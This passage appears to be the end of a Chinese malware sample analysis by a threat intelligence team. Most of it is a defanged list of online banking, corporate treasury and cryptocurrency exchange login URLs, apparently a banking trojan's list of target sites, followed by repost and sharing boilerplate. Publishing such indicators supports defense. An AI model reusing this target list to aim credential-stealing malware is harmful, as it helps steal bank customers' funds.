+    ‘hxxps://home1.cybusinessonline.co.uk'
+    ‘hxxps://online.coutts.com'
+    ‘hxxps://fdonline.co-operativebank.co.uk'
+    ‘hxxps://cardonebanking.com'
+    ‘hxxps://online.ybs.co.uk'
+    ‘hxxps://clients.tilneybestinvest.co.uk'
+    ‘hxxps://bankinguk.secure.investec.com'
+    ‘hxxps://online-business.tsb.co.uk'
+    ‘hxxps://www.nwolb.com'
+    ‘hxxps://www.commercial.hsbc.com.hk'
+    ‘hxxps://www.gs.reyrey.com'
+    ‘hxxps://www1.rbcbankusa.com'
+    ‘hxxps://business.santander.co.uk'
+    ‘hxxps://retail.santander.co.uk'
+    ‘hxxps://corporate.santander.co.uk'
+    ‘hxxps://www.365online.com'
+    ‘hxxps://www.open24.ie'
+    ‘hxxps://online.ebs.ie'
+    ‘hxxps://www.halifax-online.co.uk'
+    ‘hxxps://secure.membersaccounts.com'
+    ‘hxxps://apps.virginmoney.com'
+    ‘hxxps://online.citi.eu'
+    ‘hxxps://meine.deutsche-bank.de'
+    ‘hxxps://online.hl.co.uk'
+    ‘hxxps://my.statestreet.com'
+    ‘hxxps://jpmcsso.jpmorgan.com'
+    ‘hxxps://online.lloydsbank.co.uk'
+    ‘hxxps://online.bulbank.bg'
+    ‘hxxps://particuliers.societegenerale.fr'
+    ‘hxxps://www.mymerrill.com'
+    ‘hxxps://www.paymentnet.jpmorgan.com'
+    ‘hxxps://sponsor.voya.com'
+    ‘hxxps://www.secure.bnpparibas.net'
+    ‘hxxps://my.hsbcprivatebank.com'
+    ‘hxxps://online.bankofscotland.co.uk'
+    ‘hxxps://mijn.ing.nl'
+    ‘hxxps://access.usbank.com'
+    ‘hxxps://www6.rbc.com'
+    ‘hxxps://businessbanking.tdcommercialbanking.com'
+    ‘hxxps://www22.bmo.com'
+    ‘hxxps://uas1.cams.scotiabank.com'
+    ‘hxxps://www1.scotiaconnect.scotiabank.com'
+    ‘hxxps://accesd.affaires.desjardins.com'
+    ‘hxxps://www21.bmo.com'
+    ‘hxxps://www23.bmo.com'
+    ‘hxxps://cmo.cibc.com'
+    ‘hxxps://blockchain.info'
+    ‘hxxps://bittrex.com'
+    ‘hxxps://poloniex.com'
+    ‘hxxps://www.coinbase.com'
+    ‘hxxps://www.binance.com'
+    ‘hxxps://www.bitfinex.com'
+    ‘hxxps://www.bitstamp.net'
+    ‘hxxps://www.huobi.pro'
+    ‘hxxps://www.huobipro.com'
+    ‘hxxps://www.bithumb.com'
+    ‘hxxps://auth.hitbtc.com'
+    ‘hxxps://zaif.jp'
+    ‘hxxps://live.barcap.com'
+    ‘hxxps://personal.metrobankonline.co.uk'
+    ‘hxxps://login.secure.investec.com'
+    ‘hxxps://www.onlinebanking.natwestoffshore.com'
+    ‘hxxps://www.hsbc.co.uk'
+    ‘hxxps://cashmanagement.barclays.net'
+    ‘hxxps://www.rbsdigital.com'
+    ‘hxxps://www.ulsterbankanytimebanking.ie'
+    ‘hxxps://aibinternetbanking.aib.ie'
+    ‘hxxps://www.gemyaccounts.com'
+    ‘hxxps://www.bitmex.com'
+    ‘hxxps://www.bitflyer.jp'
+    ‘hxxps://bank.barclays.co.uk'
+    ‘hxxps://esavings.shawbrook.co.uk'
+    ‘hxxps://wholesale.flagstar.com'
+    ‘hxxps://commercial.metrobankonline.co.uk'
+    ‘hxxps://ibscassbank.btbanking.com'
+    ‘hxxps://myinvestorsbank.btbanking.com'
+    ‘hxxps://intellix.capitalonebank.com'
+    ‘hxxps://www.bankunitedbusinessonlinebanking.com'
+    ‘hxxps://securentrycorp.amegybank.com'
+    ‘hxxps://securentrycorp.calbanktrust.com'
+    ‘hxxps://securentrycorp.zionsbank.com'
+    ‘hxxps://www.gecapitalbank.com'
+    ‘hxxps://wellsoffice.wellsfargo.com'
+    ‘hxxps://access.jpmorgan.com'
+    ‘hxxps://gateway.citizenscommercialbanking.com'
+    ‘hxxps://ktt.key.com'
+    ‘hxxps://www.treasury.pncbank.com'
+    ‘hxxps://cityntl.webcashmgmt.com'
+    ‘hxxps://www.fultonbank.com'
+    ‘hxxps://cm.netteller.com'
+    ‘hxxps://businesscenter.mysynchrony.com'
+    ‘hxxps://webcmpr.bancopopular.com'
+    ‘hxxps://www.svbconnect.com'
+    ‘hxxps://santander.hpdsc.com'
+    ‘hxxps://auth.globalpay.westernunion.com'
+    ‘hxxps://globalpay.westernunion.com'
+    ‘hxxps://commerceconnections.commercebank.com'
+    ‘hxxps://pfo.us.hsbc.com'
+    ‘hxxps://cashmanager.mizuhoe-treasurer.com'
+    ‘hxxps://business-eb.ibanking-services.com'
+    ‘hxxps://tdetreasury.tdbank.com'
+    ‘hxxps://express.53.com'
+    ‘hxxps://ht.businessonlinepayroll.com'
+    ‘hxxps://onlinebusinessplus.vancity.com'
+    ‘hxxps://admin.epymtservice.com'
+    ‘hxxps://clientpoint.fisglobal.com'
+    ‘hxxps://www.bhiusa.com'
+    ‘hxxps://workbench.bnymellon.com'
+    ‘hxxps://www.cambridgefxonline.com'
+    ‘hxxps://fxpayments.americanexpress.com'
+    ‘hxxps://www.cashanalyzer.com'
+    ‘hxxps://business.firstcitizens.com'
+    ‘hxxps://businessonline.huntington.com'
+    ‘hxxps://clientlogin.ibb.ubs.com'
+    ‘hxxps://connect-ch2.ubs.com'
+    ‘hxxps://www.tranzact.org'
+    ‘hxxps://www.chase.com'
+    ‘hxxps://www.vancity.com'
+    ‘hxxps://transactgateway.svb.com'
+    ‘hxxps://secure.alpha.gr'
+    ‘hxxps://www.bancorpsouthinview.web-cashplus.com'
+    ‘hxxps://fx.regions.com'
+    ‘hxxps://businessonline.mutualofomahabank.com'
+    ‘hxxps://www.bostonprivatebank.com'
+    ‘hxxps://connect.bnymellon.com'
+    ‘hxxps://www.bostonprivate.com'
+    ‘hxxps://www.macquarieresearch.com'
+    ‘hxxps://www.winbank.gr'
+    ‘hxxps://e-access.compassbank.com'
+    ‘hxxps://treasuryconnect.mercantilcb.com'
+    ‘hxxps://securentrycorp.nsbank.com'
+    ‘hxxps://www.frostcashmanager.com'
+    ‘hxxps://an.rbcnetbank.com'
+    ‘hxxps://personal.mercantilcbonline.com'
+    ‘hxxps://www.stockplanconnect.com'
+    ‘hxxps://www.bancorpsouthonline.com'
+    ‘hxxps://jpmpb001.jpmorgan.com'
+    ‘hxxps://www.ml.com'
+    ‘hxxps://cashproonline.bankofamerica.com'
+    ‘hxxps://www.santanderbank.com'
+    ‘hxxps://cib.bankofthewest.com'
+    ‘hxxps://businessaccess.citibank.citigroup.com'
+    ‘hxxps://bank1440online.btbanking.com'
+    ‘hxxps://www8.comerica.com'
+    ‘hxxps://www.us.hsbcprivatebank.com'
+    ‘hxxps://cbforex.citizensbank.com'
+    ‘hxxps://www.efirstbank.com'
+    ‘hxxps://www.fcsolb.com'
+    ‘hxxps://www2.secure.hsbcnet.com'
+    ‘hxxps://jpmorgan.chase.com'
+    ‘hxxps://eastwest.bankonline.com'
+    ‘hxxps://fidelitytopeka.btbanking.com'
+    ‘hxxps://businessonline.tdbank.com'
+    ‘hxxps://blcweb.banquelaurentienne.ca'
+    ‘hxxps://www.goldman.com'
+    ‘hxxps://tdwealth.netxinvestor.com'
+    ‘hxxps://singlepoint.usbank.com'
+    ‘hxxps://mdcommercial.jpmorgan.com'
+    ‘hxxps://www.expat.hsbc.com'
+    ‘hxxps://onepass.regions.com'
+    ‘hxxps://cbforex.citizenscommercialbanking.com'
+    ‘hxxps://business2.danskebank.ie'
+    ‘hxxps://www.bbvanetcash.com'
+    ‘hxxps://secure.cafbank.org'
+    ‘hxxps://portal.sutorbank.de'
+    ‘hxxps://banking.martinbank.de'
+    ‘hxxps://login.isso.db.com'
+    ‘hxxps://my.hypovereinsbank.de'
+    ‘hxxps://www.banking.axa.de'
+    ‘hxxps://my.banklenz.de'
+    ‘hxxps://www.bv-activebanking.de'
+    ‘hxxps://extra.unicreditbank.hu'
+    ‘hxxps://banking.donner-reuschel.de'
+    ‘hxxps://b2b.dab-bank.de'
+    ‘hxxps://www.degussa-bank.de'
+    ‘hxxps://finanzportal.fiducia.de'
+    ‘hxxps://db-direct.db.com'
+    ‘hxxps://www.asl.com'
+    ‘hxxps://banking.ing-diba.de'
+    ‘hxxps://kunden-mkb-bank.de'
+    ‘hxxps://www.mkbag.de'
+    ‘hxxps://hbciweb.olb.de'
+    ‘hxxps://banking.oyakankerbank.de'
+    ‘hxxps://ebanking.schwaebische-bank.de'
+    ‘hxxps://banking.steylerbank.de'
+    ‘hxxps://www.unionbank.de'
+    ‘hxxps://www.volkswagenbank.de'
+    ‘hxxps://banking.berenberg.de'
+    ‘hxxps://banking.varengold.de'
+    ‘hxxps://casextern.creditplus.de'
+    ‘hxxps://ufo.union-investment.de'
+    ‘hxxps://www.mercedes-benz-bank.de'
+    ‘hxxps://wertpapier.hafnerbank.de'
+    ‘hxxps://www.bankhaus-lampe.de'
+    ‘hxxps://securebanking.hanseaticbank.de'
+    ‘hxxps://meine.sutorbank.de'
+    ‘hxxps://e-bank.wuestenrot.de'
+    ‘hxxps://online.bank-abc.com'
+    ‘hxxps://banking.bankofscotland.de'
+    ‘hxxps://ebank.garantibank.nl'
+    ‘hxxps://hypoonline.hypotirol.com'
+    ‘hxxps://banking.oberbank.de'
+    ‘hxxps://www.banking-oberbank.at'
+    ‘hxxps://kunde.onvista-bank.de'
+    ‘hxxps://www.abnamro.nl'
+    ‘hxxps://kso.bw-bank.de'
+    ‘hxxps://www.moneyou.de'
+    ‘hxxps://banking.haspa.de'
+    ‘hxxps://www.dslbank.de'
+    ‘hxxps://ebanking.denizbank.at'
+    ‘hxxps://meine.postbank.de'
+    ‘hxxps://webzr.aktivbank.de'
+    ‘hxxps://akp.aab.de'
+    ‘hxxps://portal.baaderbank.de'
+    ‘hxxps://portal4.sydbank.dk'
+    ‘hxxps://www.sydbank.de'
+    ‘hxxps://ssl.icoio.de'
+    ‘hxxps://konto.biw-bank.de'
+    ‘hxxps://banking.bmwbank.de'
+    ‘hxxps://www.hypotirol.com'
+    ‘hxxps://firmenkarten.degussa-bank.de'
+    ‘hxxps://apps.bhw.de'
+    ‘hxxps://konto.baaderbank.de'
+    ‘hxxps://securebank.santander.de'
+    ‘hxxps://online.akbank.de'
+    ‘hxxps://portal.berenberg.de'
+
+本文翻译自 [原文链接]()。如若转载请注明出处。
+
+商务合作，文章发布请联系 anquanke@360.cn
+
+本文由 **奇安信威胁情报中心** 原创发布
+
+转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
+[https://www.anquanke.com/post/id/167648](/post/id/167648)
+
+安全客 - 有思想的安全新媒体
+
+本文转载自: []()
+
+如若转载,请注明出处： []()
+
+安全客 - 有思想的安全新媒体
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
+  * [恶意软件](/tag/恶意软件)
+  * [样本分析](/tag/样本分析)
+
+ **+1** __9赞
+
+ __收藏
+
+![](https://p3.ssl.qhimg.com/t01dce0f9e833e11f13.png) 奇安信威胁情报中心
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
